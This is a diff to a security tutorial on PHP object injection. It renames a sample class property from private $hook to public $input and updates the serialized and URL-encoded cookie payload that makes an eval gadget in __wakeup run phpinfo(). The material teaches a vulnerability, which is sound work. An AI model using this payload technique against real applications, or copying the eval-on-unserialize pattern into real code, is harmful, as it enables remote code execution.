@@ -141,10 +141,10 @@ PHP object injection attacks occur when the attacker controls the input to a var
 ```php
 class Example
 {
-  private $hook;
+  public $input;
 
   function __wakeup(){
-      if (isset($this->hook)) eval($this->hook);
+      if (isset($this->input)) eval($this->input);
   }
 }
 
@@ -158,7 +158,7 @@ In the above example, since the input ```data``` cookie is unserialized, an atta
 ```php
 class Example
 {
-    private $hook = "phpinfo();";
+    public $input = "phpinfo();";
 }
 
 print urlencode(serialize(new Example));
@@ -167,10 +167,10 @@ print urlencode(serialize(new Example));
 The URL encoding is done since we would pass this string through a URL. The generated string looks as follows:
 
 Before URL encoding:
-```O:7:"Example":1:{s:13:"Examplehook";s:10:"phpinfo();";}```
+```O:7:"Example":1:{s:5:"input";s:10:"phpinfo();";}```
 
 After URL encoding:
-```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A13%3A%22%00Example%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D```
+```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A5%3A%22input%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D```
 
 Passing the string above into the ```data``` cookie, the ```phpinfo()``` function will be executed. The flow of the program looks as follows:
 
